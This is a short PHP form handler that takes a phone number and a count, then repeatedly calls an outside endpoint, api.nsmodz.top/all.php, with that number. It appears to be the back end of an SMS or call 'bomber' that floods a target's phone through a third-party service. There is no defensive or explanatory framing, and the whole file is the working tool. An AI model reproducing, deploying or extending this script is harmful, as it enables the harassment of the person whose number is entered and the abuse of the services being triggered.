<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $phone = $_POST['phone'];
    $amount = (int)$_POST['amount'];

    if (!empty($phone) && $amount > 0) {
        // Loop to call the API based on the specified amount
        for ($i = 1; $i <= $amount; $i++) {
            $url = "https://api.nsmodz.top/all.php?phone=" . urlencode($phone);
            // Making the API request using file_get_contents
            $response = file_get_contents($url);
            // Optionally, log the response for debugging
            error_log("Response from $url: $response");
        }

        echo 'APIs have been called successfully.';
    } else {
        echo 'Please enter a valid phone number and amount.';
    }
    exit;
}
?>
